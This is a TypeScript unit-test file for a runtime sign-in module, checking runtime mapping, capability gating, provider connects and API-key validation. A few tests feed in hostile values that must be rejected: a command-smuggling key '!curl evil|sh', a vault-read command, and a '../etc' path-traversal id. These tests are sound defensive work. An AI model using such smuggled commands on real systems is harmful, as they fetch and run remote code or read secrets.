import assert from "node:assert/strict";
import { describe, it } from "vitest";

import {
  DAEMON_CAPABILITY_RUNTIME_AUTH,
  DAEMON_CAPABILITY_RUNTIME_AUTH_ANTIGRAVITY,
  DAEMON_CAPABILITY_RUNTIME_AUTH_ANTIGRAVITY_LOGOUT,
  DAEMON_CAPABILITY_RUNTIME_AUTH_GROK,
  DAEMON_CAPABILITY_RUNTIME_AUTH_CODEBUDDY,
  DAEMON_CAPABILITY_RUNTIME_AUTH_OPENCODE,
  DAEMON_CAPABILITY_RUNTIME_AUTH_PI,
  DAEMON_CAPABILITY_RUNTIME_AUTH_QWEN_PROVIDER,
  DAEMON_CAPABILITY_RUNTIME_AUTH_V2,
  runtimeAuthLogoutNeedsCapability,
  runtimeAuthLogoutRuntimesOfComputer,
  runtimeAuthRuntimesOfComputer,
  sharedCredentialsAuthRuntime,
} from "./index";
import {
  RUNTIME_AUTH_LOGIN_FAILURE_REASONS,
  RUNTIME_AUTH_LOGIN_REGIONS,
  RUNTIME_AUTH_LOGIN_REGION_CHOICES,
  RUNTIME_AUTH_PROVIDER_API_KEY_MAX_LENGTH,
  RUNTIME_AUTH_RUNTIMES,
  isOpencodeLiteralApiKey,
  isPiLiteralApiKey,
  isRuntimeAuthServerGated,
  parseRuntimeAuthProviderConnectInput,
  runtimeAuthChoosesOAuthMethod,
  runtimeAuthLoginRegionFits,
  runtimeAuthLoginResultSchema,
  runtimeAuthLogoutResultSchema,
  runtimeAuthOAuthMethodLabelSchema,
  runtimeAuthOAuthMethodFits,
  runtimeAuthProviderConnectFits,
  runtimeAuthProviderIdFits,
  runtimeAuthProviderSchema,
  runtimeAuthSignsInPerProvider,
  runtimeAuthProviderConnectResultSchema,
  runtimeAuthProvidersResultSchema,
  runtimeAuthRuntimeFor,
  runtimeAuthStatusReportSchema,
  runtimeAuthSupports,
} from "./runtimeAuth";

describe("runtime auth runtimes", () => {
  it("maps Raft runtime ids to the runtime whose sign-in they use", () => {
    assert.equal(runtimeAuthRuntimeFor("claude"), "claude");
    assert.equal(runtimeAuthRuntimeFor("codex"), "codex");
    assert.equal(runtimeAuthRuntimeFor("kimi-sdk"), "kimi", "Kimi Code signs in through OAR's kimi");
    assert.equal(runtimeAuthRuntimeFor("qoder"), "qoder");
    assert.equal(runtimeAuthRuntimeFor("qwen"), "qwen");
    assert.equal(runtimeAuthRuntimeFor("antigravity"), "antigravity", "Antigravity signs in through OAR's antigravity (agy)");
    assert.equal(runtimeAuthRuntimeFor("pi"), "pi", "the standalone Pi runtime signs in on the Computer's Pi sign-ins");
    assert.equal(runtimeAuthRuntimeFor("grok"), "grok", "Grok Build, on either host, runs the grok CLI on the Computer's own sign-in");
    assert.equal(runtimeAuthRuntimeFor("opencode"), "opencode", "OpenCode runs on the Computer's own OpenCode sign-ins");
    // The deprecated Kimi CLI runs on ~/.kimi, which OAR's kimi sign-in does not touch.
    // Built-in Pi runs on a per-agent, isolated agent dir: a Computer sign-in never reaches it.
    for (const other of ["kimi", "cursor", "builtin", "constructor", ""]) {
      assert.equal(runtimeAuthRuntimeFor(other), null, other);
    }
  });

  it("offers Qoder a sign-in but no sign-out, Qwen Code a provider key only; every other runtime both (Antigravity's sign-out since OAR 0.98)", () => {
    const withAction = (action: Parameters<typeof runtimeAuthSupports>[1]) => RUNTIME_AUTH_RUNTIMES.filter((runtime) => runtimeAuthSupports(runtime, action));
    assert.deepEqual(withAction("login"), ["claude", "codex", "kimi", "qoder", "antigravity", "pi", "grok", "opencode", "codebuddy"]);
    assert.deepEqual(withAction("logout"), ["claude", "codex", "kimi", "antigravity", "pi", "grok", "opencode", "codebuddy"]);
    assert.deepEqual(withAction("connect_provider"), ["qwen", "pi", "opencode"]);
  });

  it("signs Pi and OpenCode in per provider, and only them: a provider id is required there and refused elsewhere", () => {
    assert.deepEqual(RUNTIME_AUTH_RUNTIMES.filter(runtimeAuthSignsInPerProvider), ["pi", "opencode"]);
    assert.ok(runtimeAuthProviderIdFits("pi", "anthropic"));
    assert.ok(runtimeAuthProviderIdFits("pi", "openai-codex"));
    assert.ok(runtimeAuthProviderIdFits("opencode", "github-copilot"));
    for (const bad of [undefined, null, "", "-x", "a b", "x".repeat(65), 7]) {
      assert.equal(runtimeAuthProviderIdFits("pi", bad), false, String(bad));
      assert.equal(runtimeAuthProviderIdFits("opencode", bad), false, String(bad));
    }
    for (const runtime of RUNTIME_AUTH_RUNTIMES.filter((runtime) => !runtimeAuthSignsInPerProvider(runtime))) {
      assert.ok(runtimeAuthProviderIdFits(runtime, undefined), runtime);
      assert.equal(runtimeAuthProviderIdFits(runtime, "anthropic"), false, runtime);
    }
  });

  it("reads the runtimes a Computer signs in from its capabilities", () => {
    const auth = DAEMON_CAPABILITY_RUNTIME_AUTH;
    const v2 = DAEMON_CAPABILITY_RUNTIME_AUTH_V2;
    const qwen = DAEMON_CAPABILITY_RUNTIME_AUTH_QWEN_PROVIDER;
    const agy = DAEMON_CAPABILITY_RUNTIME_AUTH_ANTIGRAVITY;
    const pi = DAEMON_CAPABILITY_RUNTIME_AUTH_PI;
    const grok = DAEMON_CAPABILITY_RUNTIME_AUTH_GROK;
    assert.deepEqual(runtimeAuthRuntimesOfComputer([]), []);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([v2, qwen, agy]), [], "V2 alone is no runtime auth");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth]), ["claude", "codex"]);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, agy]), ["claude", "codex"], "Antigravity needs V2 too");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2]), ["claude", "codex", "kimi", "qoder"], "a Computer from before Qwen Code drops its requests");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, qwen]), ["claude", "codex", "kimi", "qoder", "qwen"], "a Computer from before Antigravity drops its login");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, agy]), ["claude", "codex", "kimi", "qoder", "antigravity"]);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, qwen, agy]), ["claude", "codex", "kimi", "qoder", "qwen", "antigravity"], "a Computer from before Pi drops its requests");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, pi]), ["claude", "codex", "kimi", "qoder", "pi"]);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, pi]), ["claude", "codex"], "Pi needs V2 too");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, qwen, agy, pi]), ["claude", "codex", "kimi", "qoder", "qwen", "antigravity", "pi"], "a Computer from before Grok's sign-in (OAR 0.98) drops its requests");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, grok]), ["claude", "codex", "kimi", "qoder", "grok"]);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, grok]), ["claude", "codex"], "Grok needs V2 too");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, qwen, agy, pi, grok]).includes("opencode"), false, "a Computer from before OpenCode's sign-in (OAR 0.99) drops its requests");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, DAEMON_CAPABILITY_RUNTIME_AUTH_OPENCODE]), ["claude", "codex", "kimi", "qoder", "opencode"]);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, DAEMON_CAPABILITY_RUNTIME_AUTH_OPENCODE]), ["claude", "codex"], "OpenCode needs V2 too");
    assert.equal(runtimeAuthRuntimesOfComputer([auth, v2, qwen, agy, pi, grok, DAEMON_CAPABILITY_RUNTIME_AUTH_OPENCODE]).includes("codebuddy"), false, "a Computer from before CodeBuddy's sign-in drops its requests");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, DAEMON_CAPABILITY_RUNTIME_AUTH_CODEBUDDY]), ["claude", "codex", "kimi", "qoder", "codebuddy"]);
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, DAEMON_CAPABILITY_RUNTIME_AUTH_CODEBUDDY]), ["claude", "codex"], "CodeBuddy needs V2 too");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, DAEMON_CAPABILITY_RUNTIME_AUTH_CODEBUDDY]), ["claude", "codex", "kimi", "codebuddy"], "CodeBuddy's sign-out comes with its sign-in");
    assert.deepEqual(runtimeAuthRuntimesOfComputer([auth, v2, qwen, agy, pi, grok, DAEMON_CAPABILITY_RUNTIME_AUTH_OPENCODE, DAEMON_CAPABILITY_RUNTIME_AUTH_CODEBUDDY]), RUNTIME_AUTH_RUNTIMES);
    assert.equal(runtimeAuthRuntimesOfComputer([auth, v2, qwen]), runtimeAuthRuntimesOfComputer([qwen, v2, auth]), "the same capabilities give the same array");
    assert.equal(runtimeAuthRuntimesOfComputer([auth, v2, pi, qwen]), runtimeAuthRuntimesOfComputer([qwen, pi, v2, auth]));
  });

  it("signs Antigravity out only on a Computer whose daemon runs its logout (an OAR 0.97 daemon would answer unsupported)", () => {
    const auth = DAEMON_CAPABILITY_RUNTIME_AUTH;
    const v2 = DAEMON_CAPABILITY_RUNTIME_AUTH_V2;
    const qwen = DAEMON_CAPABILITY_RUNTIME_AUTH_QWEN_PROVIDER;
    const agy = DAEMON_CAPABILITY_RUNTIME_AUTH_ANTIGRAVITY;
    const agyLogout = DAEMON_CAPABILITY_RUNTIME_AUTH_ANTIGRAVITY_LOGOUT;
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([]), []);
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, agyLogout]), ["claude", "codex"]);
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, qwen]), ["claude", "codex", "kimi"], "no sign-out for Qoder or Qwen Code");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, qwen, agy]), ["claude", "codex", "kimi"], "signs Antigravity in, but cannot log it out");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, agyLogout]), ["claude", "codex", "kimi"], "no logout without its sign-in");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, qwen, agy, agyLogout]), ["claude", "codex", "kimi", "antigravity"]);
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, DAEMON_CAPABILITY_RUNTIME_AUTH_PI]), ["claude", "codex", "kimi", "pi"], "Pi's sign-out comes with its sign-in");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, DAEMON_CAPABILITY_RUNTIME_AUTH_GROK]), ["claude", "codex", "kimi", "grok"], "Grok's sign-out comes with its sign-in");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, DAEMON_CAPABILITY_RUNTIME_AUTH_OPENCODE]), ["claude", "codex", "kimi", "opencode"], "OpenCode's sign-out comes with its sign-in");
    assert.deepEqual(runtimeAuthLogoutRuntimesOfComputer([auth, v2, qwen, agy, agyLogout]).includes("grok"), false, "an OAR 0.98 Computer is never sent a Grok sign-out");
    assert.deepEqual(RUNTIME_AUTH_RUNTIMES.filter(runtimeAuthLogoutNeedsCapability), ["antigravity"]);
  });

  it("leaves Antigravity alone to the server's say (its revive flag); CodeBuddy Code, like Qoder, has no server flag", () => {
    assert.deepEqual(RUNTIME_AUTH_RUNTIMES.filter(isRuntimeAuthServerGated), ["antigravity"]);
  });

  it("signs CodeBuddy Code in on its own Raft runtime, with no region or provider", () => {
    assert.equal(runtimeAuthRuntimeFor("codebuddy"), "codebuddy");
    assert.ok(runtimeAuthLoginRegionFits("codebuddy", undefined));
    assert.equal(runtimeAuthSignsInPerProvider("codebuddy"), false);
  });
});

describe("runtime auth login regions", () => {
  it("asks for a region before Kimi's login only", () => {
    assert.deepEqual(RUNTIME_AUTH_RUNTIMES.filter((runtime) => RUNTIME_AUTH_LOGIN_REGION_CHOICES[runtime].length > 0), ["kimi"]);
    assert.deepEqual(RUNTIME_AUTH_LOGIN_REGION_CHOICES.kimi, ["mainland-cn", "global"]);
  });

  it("takes Kimi's start with a chosen region only: no region, or one Kimi does not know, does not fit", () => {
    for (const region of RUNTIME_AUTH_LOGIN_REGIONS) assert.ok(runtimeAuthLoginRegionFits("kimi", region), region);
    for (const region of [undefined, null, "", "auto", "cn", "MAINLAND-CN", 1]) {
      assert.equal(runtimeAuthLoginRegionFits("kimi", region), false, String(region));
    }
  });

  it("refuses a region on every other runtime, and takes their starts as before", () => {
    for (const runtime of RUNTIME_AUTH_RUNTIMES.filter((runtime) => runtime !== "kimi")) {
      assert.ok(runtimeAuthLoginRegionFits(runtime, undefined), runtime);
      assert.equal(runtimeAuthLoginRegionFits(runtime, "global"), false, runtime);
    }
  });
});

describe("runtimeAuthStatusReportSchema", () => {
  const collectedAt = "2026-10-29T10:00:00.000Z";

  it("reads Kimi, Qoder and Qwen Code beside Claude Code and Codex", () => {
    const runtimes = { claude: { kind: "logged_out" }, kimi: { kind: "logged_in" }, qoder: { kind: "unknown" }, qwen: { kind: "logged_in" } };
    assert.deepEqual(runtimeAuthStatusReportSchema.parse({ collectedAt, runtimes }).runtimes, runtimes);
  });

  it("reads Antigravity beside the others", () => {
    const runtimes = { codex: { kind: "logged_in" }, antigravity: { kind: "logged_out" } };
    assert.deepEqual(runtimeAuthStatusReportSchema.parse({ collectedAt, runtimes }).runtimes, runtimes);
  });

  it("reads Grok beside the others", () => {
    const runtimes = { claude: { kind: "logged_in" }, grok: { kind: "logged_in", account: { methodLabel: "grok.com" } } };
    assert.deepEqual(runtimeAuthStatusReportSchema.parse({ collectedAt, runtimes }).runtimes, runtimes);
  });

  it("reads Pi's stored providers, and nothing a key or token could be in", () => {
    const runtimes = {
      pi: {
        kind: "logged_in",
        providers: [
          { id: "anthropic", label: "Anthropic", method: "oauth", subscription: true },
          { id: "deepseek", label: "DeepSeek", method: "api_key" },
        ],
      },
    };
    assert.deepEqual(runtimeAuthStatusReportSchema.parse({ collectedAt, runtimes }).runtimes, runtimes);
    assert.equal(runtimeAuthStatusReportSchema.safeParse({
      collectedAt,
      runtimes: { pi: { kind: "logged_in", providers: [{ id: "deepseek", label: "DeepSeek", method: "api_key", key: "sk-1" }] } },
    }).success, false, "a provider row has no room for a key");
  });

  it("reads OpenCode's stored providers, with no subscription claim", () => {
    const runtimes = { opencode: { kind: "logged_in", providers: [{ id: "github-copilot", label: "GitHub Copilot", method: "oauth" }] } };
    assert.deepEqual(runtimeAuthStatusReportSchema.parse({ collectedAt, runtimes }).runtimes, runtimes);
    const v1 = { opencode: { kind: "unavailable", reason: "version_unsupported" } };
    assert.deepEqual(runtimeAuthStatusReportSchema.parse({ collectedAt, runtimes: v1 }).runtimes, v1);
  });

  it("drops a runtime it does not know instead of refusing the whole report", () => {
    const parsed = runtimeAuthStatusReportSchema.safeParse({
      collectedAt,
      runtimes: { codex: { kind: "logged_in" }, someFutureRuntime: { kind: "whatever" } },
    });
    assert.ok(parsed.success);
    assert.deepEqual(parsed.data.runtimes, { codex: { kind: "logged_in" } });
  });

  it("still refuses a known runtime's malformed status", () => {
    assert.equal(runtimeAuthStatusReportSchema.safeParse({ collectedAt, runtimes: { kimi: { kind: "signed_in" } } }).success, false);
  });
});

describe("Qwen Code provider connect", () => {
  const KEY = "sk-live-0123456789abcdef";

  it("takes a provider, a key and, where the provider needs them, an endpoint and a model", () => {
    assert.deepEqual(parseRuntimeAuthProviderConnectInput({ providerId: "deepseek", apiKey: ` ${KEY}\n` }), {
      ok: true,
      input: { providerId: "deepseek", apiKey: KEY },
    }, "a pasted key is trimmed");
    assert.deepEqual(parseRuntimeAuthProviderConnectInput({
      providerId: "custom-openai-compatible",
      apiKey: KEY,
      baseUrl: "http://127.0.0.1:11434/v1",
      modelIds: ["qwen3-coder"],
    }), {
      ok: true,
      input: { providerId: "custom-openai-compatible", apiKey: KEY, baseUrl: "http://127.0.0.1:11434/v1", modelIds: ["qwen3-coder"] },
    });
  });

  it("names the field that is wrong, never its value", () => {
    const field = (value: unknown) => {
      const parsed = parseRuntimeAuthProviderConnectInput(value);
      assert.ok(!JSON.stringify(parsed).includes(KEY), "the key is never echoed");
      return parsed.ok ? null : parsed.field;
    };
    assert.equal(field(null), "providerId");
    assert.equal(field({ providerId: "../etc", apiKey: KEY }), "providerId");
    assert.equal(field({ providerId: "deepseek" }), "apiKey");
    assert.equal(field({ providerId: "deepseek", apiKey: "   " }), "apiKey");
    assert.equal(field({ providerId: "deepseek", apiKey: `${KEY} ${KEY}` }), "apiKey");
    assert.equal(field({ providerId: "deepseek", apiKey: `${KEY}\u0000` }), "apiKey");
    assert.equal(field({ providerId: "deepseek", apiKey: "k".repeat(RUNTIME_AUTH_PROVIDER_API_KEY_MAX_LENGTH + 1) }), "apiKey");
    assert.equal(field({ providerId: "deepseek", apiKey: KEY, baseUrl: "ftp://example.com" }), "baseUrl");
    assert.equal(field({ providerId: "coding-plan", apiKey: KEY, baseUrl: "http://coding.dashscope.aliyuncs.com/v1" }), "baseUrl", "plain http only for a URL the person types");
    assert.equal(field({ providerId: "deepseek", apiKey: KEY, baseUrl: `https://user:${KEY}@example.com/v1` }), "baseUrl", "no credential rides in a URL");
    assert.equal(field({ providerId: "deepseek", apiKey: KEY, baseUrl: "not a url" }), "baseUrl");
    assert.equal(field({ providerId: "deepseek", apiKey: KEY, modelIds: [] }), "modelIds");
    assert.equal(field({ providerId: "deepseek", apiKey: KEY, modelIds: ["two words"] }), "modelIds");
  });

  it("relays a provider list with only what the choice needs, and every outcome of a connect", () => {
    const listed = runtimeAuthProvidersResultSchema.safeParse({
      kind: "listed",
      providers: [
        { id: "deepseek", label: "DeepSeek API Key", configured: true, endpoint: { kind: "fixed" }, needsModelIds: false },
        {
          id: "coding-plan",
          label: "Coding Plan",
          description: "For individual developers",
          group: { id: "alibaba", label: "Alibaba ModelStudio" },
          configured: false,
          endpoint: { kind: "choice", options: [{ id: "aliyun", label: "China (Beijing)", url: "https://coding.dashscope.aliyuncs.com/v1" }] },
          needsModelIds: false,
        },
        { id: "custom-openai-compatible", label: "Custom Provider", configured: false, endpoint: { kind: "custom", placeholder: "https://api.openai.com/v1" }, needsModelIds: true },
      ],
    });
    assert.ok(listed.success);
    // A provider's stored settings are not relayed: only whether there are any.
    assert.equal(runtimeAuthProvidersResultSchema.safeParse({
      kind: "listed",
      providers: [{ id: "deepseek", label: "DeepSeek", configured: true, existingConfig: { hasApiKey: true }, endpoint: { kind: "fixed" }, needsModelIds: false }],
    }).success, false);
    // A chosen endpoint is https: the URL comes from the runtime's own menu.
    assert.equal(runtimeAuthProvidersResultSchema.safeParse({
      kind: "listed",
      providers: [{ id: "x", label: "X", configured: false, endpoint: { kind: "choice", options: [{ id: "a", label: "A", url: "http://x.example" }] }, needsModelIds: false }],
    }).success, false);
    for (const result of [{ kind: "connected" }, { kind: "busy" }, { kind: "failed", reason: "timed_out" }, { kind: "failed", reason: "relay_failed" }, { kind: "unsupported", reason: "not_installed" }]) {
      assert.ok(runtimeAuthProviderConnectResultSchema.safeParse(result).success, result.kind);
    }
  });
});

describe("Antigravity agents and the Computer's shared sign-in", () => {
  it("run on the shared sign-in (a web login clears their hold; a provider limit is shared) unless GEMINI_HOME or HOME gives one its own", () => {
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "antigravity", model: "default" }), "antigravity");
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "antigravity", model: "default", envVars: { GEMINI_HOME: "/srv/agy" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "antigravity", model: "default", envVars: { HOME: "/srv/home" } }), null);
  });
});

describe("Grok agents and the Computer's shared sign-in", () => {
  it("run on the shared sign-in on either host unless GROK_HOME, HOME or an xAI API key gives one its own", () => {
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "grok", model: "default" }), "grok");
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "grok", model: "default", envVars: { GROK_HOME: "/srv/grok" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "grok", model: "default", envVars: { HOME: "/srv/home" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "grok", model: "default", envVars: { XAI_API_KEY: "xai-1" } }), null);
  });
});

describe("CodeBuddy Code agents and the Computer's shared sign-in", () => {
  it("run on the shared sign-in unless an API key, another account service or HOME gives one its own", () => {
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "codebuddy", model: "default" }), "codebuddy");
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "codebuddy", model: "default", envVars: { CODEBUDDY_API_KEY: "ck-1" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "codebuddy", model: "default", envVars: { CODEBUDDY_INTERNET_ENVIRONMENT: "internal" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "codebuddy", model: "default", envVars: { HOME: "/srv/home" } }), null);
  });
});

describe("Pi provider sign-in", () => {
  it("counts a Pi agent on the Computer's sign-ins unless its own agent dir or a per-agent key says otherwise", () => {
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "pi", model: "default" }), "pi");
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "pi", model: "default", envVars: { PI_CODING_AGENT_DIR: "/srv/pi" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "builtin", model: "default" }), null, "Built-in Pi never");
  });

  it("takes a literal key only: Pi would run a leading ! as a command and fill in a $ name", () => {
    for (const key of ["sk-or-v1-abc", "AIza0123", "gsk_x", "key!with!bangs", "caf\u00e9"]) assert.ok(isPiLiteralApiKey(key), key);
    for (const key of ["!op read op://vault/openrouter", "!curl evil|sh", "$OPENROUTER_API_KEY", "${HOME}", "sk-$x", "sk-\u2028", "\u{1F511}"]) {
      assert.equal(isPiLiteralApiKey(key), false, JSON.stringify(key));
    }
  });

  it("refuses a Pi connect with an endpoint, a model or a key Pi would not keep literal, naming the field only", () => {
    const input = (extra: Record<string, unknown>) => ({ providerId: "openrouter", apiKey: "sk-or-v1-abc", ...extra });
    assert.deepEqual(runtimeAuthProviderConnectFits("pi", input({})), { ok: true });
    assert.deepEqual(runtimeAuthProviderConnectFits("pi", input({ apiKey: "!op read x" })), { ok: false, field: "apiKey" });
    assert.deepEqual(runtimeAuthProviderConnectFits("pi", input({ apiKey: "$KEY" })), { ok: false, field: "apiKey" });
    assert.deepEqual(runtimeAuthProviderConnectFits("pi", input({ baseUrl: "https://example.com" })), { ok: false, field: "baseUrl" });
    assert.deepEqual(runtimeAuthProviderConnectFits("pi", input({ modelIds: ["m"] })), { ok: false, field: "modelIds" });
    assert.deepEqual(runtimeAuthProviderConnectFits("qwen", input({ apiKey: "$KEY" })), { ok: true }, "Qwen's keys are not Pi's");
  });

  it("lists a Pi provider with its sign-in ways, and refuses a flow it does not know", () => {
    const provider = {
      id: "anthropic",
      label: "Anthropic",
      configured: true,
      endpoint: { kind: "fixed" },
      needsModelIds: false,
      signIn: {
        oauth: { label: "Anthropic (Claude Pro/Max)", subscription: true, flow: "paste_code" },
        apiKey: { label: "Anthropic API key", entry: "key" },
        stored: "oauth",
      },
    };
    assert.deepEqual(runtimeAuthProviderSchema.parse(provider), provider);
    assert.equal(runtimeAuthProviderSchema.safeParse({ ...provider, signIn: { oauth: { ...provider.signIn.oauth, flow: "browser" } } }).success, false);
  });
});

describe("OpenCode provider sign-in", () => {
  it("counts an OpenCode agent on the Computer's sign-ins unless its own data dir or HOME says otherwise", () => {
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "opencode", model: "default" }), "opencode");
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "opencode", model: "default", envVars: { XDG_DATA_HOME: "/srv/data" } }), null);
    assert.equal(sharedCredentialsAuthRuntime({ runtime: "opencode", model: "default", envVars: { HOME: "/srv/home" } }), null);
  });

  it("lets the person choose the OAuth method for OpenCode only, by a short label", () => {
    assert.deepEqual(RUNTIME_AUTH_RUNTIMES.filter(runtimeAuthChoosesOAuthMethod), ["opencode"]);
    assert.ok(runtimeAuthOAuthMethodFits("opencode", undefined), "absent: the provider's preferred method");
    assert.ok(runtimeAuthOAuthMethodFits("opencode", "Login with GitHub (device)"));
    for (const bad of ["", " padded", "x".repeat(81), "line\nbreak", 3, null]) {
      assert.equal(runtimeAuthOAuthMethodFits("opencode", bad), false, JSON.stringify(bad));
    }
    assert.equal(runtimeAuthOAuthMethodFits("pi", "Anthropic (Claude Pro/Max)"), false, "Pi picks its own mode");
    assert.ok(runtimeAuthOAuthMethodFits("pi", undefined));
  });

  it("takes a literal key only: no {env:} or {file:} reference, one byte per character", () => {
    for (const key of ["sk-abc", "key$with$dollars", "!bang-first", "caf\u00e9"]) assert.ok(isOpencodeLiteralApiKey(key), key);
    for (const key of ["{env:OPENAI_API_KEY}", "{FILE:~/.key}", "sk-{env:X}", "\u{1F511}"]) {
      assert.equal(isOpencodeLiteralApiKey(key), false, JSON.stringify(key));
    }
    const input = (extra: Record<string, unknown>) => ({ providerId: "deepseek", apiKey: "sk-abc", ...extra });
    assert.deepEqual(runtimeAuthProviderConnectFits("opencode", input({})), { ok: true });
    assert.deepEqual(runtimeAuthProviderConnectFits("opencode", input({ apiKey: "{env:KEY}" })), { ok: false, field: "apiKey" });
    assert.deepEqual(runtimeAuthProviderConnectFits("opencode", input({ baseUrl: "https://example.com" })), { ok: false, field: "baseUrl" });
    assert.deepEqual(runtimeAuthProviderConnectFits("opencode", input({ apiKey: "$KEY" })), { ok: true }, "a $ is literal for OpenCode, unlike Pi");
  });

  it("lists an OpenCode provider with every OAuth method and no subscription claim", () => {
    const provider = {
      id: "github-copilot",
      label: "GitHub Copilot",
      configured: false,
      endpoint: { kind: "fixed" },
      needsModelIds: false,
      signIn: { oauthMethods: [{ label: "Login with GitHub (device)", flow: "device_code" }, { label: "Login with GitHub", flow: "link" }] },
    };
    assert.deepEqual(runtimeAuthProviderSchema.parse(provider), provider);
    assert.equal(runtimeAuthProviderSchema.safeParse({ ...provider, signIn: { oauthMethods: [] } }).success, false, "never an empty list");
    const oauthNoSubscription = { ...provider, signIn: { oauth: { label: "OpenAI", flow: "link" } } };
    assert.ok(runtimeAuthProviderSchema.safeParse(oauthNoSubscription).success, "subscription is optional (OAR 0.100)");
  });

  it("carries a method label as OAR gave it: never trimmed, one odd label refused on its own", () => {
    assert.ok(runtimeAuthOAuthMethodLabelSchema.safeParse("Codex device code (legacy)").success);
    for (const bad of [" leading", "tab\there", "", "x".repeat(81)]) assert.equal(runtimeAuthOAuthMethodLabelSchema.safeParse(bad).success, false, JSON.stringify(bad));
  });

  it("answers an OpenCode sign-out busy while a sign-in holds its facade", () => {
    assert.ok(runtimeAuthLogoutResultSchema.safeParse({ kind: "failed", reason: "busy" }).success);
  });

  it("ends a login as loopback_required when only a browser on the Computer could finish it", () => {
    assert.ok(RUNTIME_AUTH_LOGIN_FAILURE_REASONS.includes("loopback_required"));
    assert.ok(runtimeAuthLoginResultSchema.safeParse({ kind: "failed", reason: "loopback_required" }).success);
  });
});
